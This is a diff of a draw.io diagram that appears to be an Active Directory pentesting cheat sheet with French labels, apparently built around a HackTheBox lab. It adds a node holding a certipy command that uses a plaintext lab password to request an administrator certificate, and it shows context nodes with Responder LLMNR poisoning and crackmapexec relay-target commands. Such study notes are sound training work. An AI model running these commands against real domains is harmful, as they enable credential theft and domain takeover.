@@ -577,7 +577,7 @@
     </mxGraphModel>
   </diagram>
   <diagram name="from creds" id="DHAbqxUyTUS8Uim03K_V">
-    <mxGraphModel dx="2847" dy="2162" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
+    <mxGraphModel dx="2241" dy="1864" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
@@ -1183,6 +1183,11 @@
         <object label="&lt;div&gt;Poisonning LLMNR (broadcast)&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;&lt;br&gt;&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;&amp;nbsp;#use --lm to force lm downgrade&lt;br&gt;&lt;/font&gt;&lt;font color=&quot;#2a7bde&quot;&gt;#&amp;nbsp;disable smb &amp;amp; http if relay&lt;/font&gt;&lt;/div&gt;" Generate-smb-targets="cme smb --gen-relay-list smb_targets.txt 10.240.5.0/24" poson-LLMNR="responder -I eth0" id="fD-_GtY84_5rHbtJkZOW-1">
           <mxCell parent="1" style="whiteSpace=wrap;html=1;fontSize=14;rounded=1;strokeColor=#e5a50a;" vertex="1">
             <mxGeometry height="90" width="240" x="200" y="2165" as="geometry" />
+          </mxCell>
+        </object>
+        <object label="&lt;p id=&quot;adcs---esc1&quot;&gt;&lt;b&gt;ESC8: &lt;font color=&quot;#4a86e8&quot;&gt;voir ci-dessous dans les relais&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;" Commande="certipy req -u Ryan.Cooper@sequel.htb -p &#39;NuclearMosquito3&#39; -target dc.sequel.htb -template UserAuthentication -ca sequel-DC-CA -upn administrator@sequel.htb" id="btU5C9BKbJ7t9n6mt091-1">
+          <mxCell parent="1" style="rounded=1;whiteSpace=wrap;html=1;strokeColor=default;" vertex="1">
+            <mxGeometry height="60" width="160" x="-140" y="1620" as="geometry" />
           </mxCell>
         </object>
       </root>
